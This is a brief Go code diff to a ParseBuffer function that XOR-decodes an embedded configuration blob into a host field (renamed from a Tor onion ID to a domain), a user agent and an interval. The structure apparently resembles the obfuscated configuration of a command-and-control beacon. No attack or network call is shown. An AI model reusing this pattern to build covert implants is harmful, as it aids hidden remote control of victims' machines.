@@ -7,7 +7,7 @@ import (
 )
 
 type Config struct {
-	torID     string
+	domain     string
 	interval  int32
 	userAgent string
 
@@ -41,7 +41,7 @@ func (c *Config) ParseBuffer(buf []byte) {
 	for i := 0; i < len(buf); i++ {
 		buf[i] ^= 0x69
 	}
-	c.torID = string(buf[:56])
+	c.domain = strings.Trim(string(buf[:56]), "\x00")
 	c.userAgent = strings.Trim(string(buf[56:312]), "\x00")
 	c.interval = int32(binary.BigEndian.Uint32(buf[312:316]))
 	if buf[316] == 0x00 {
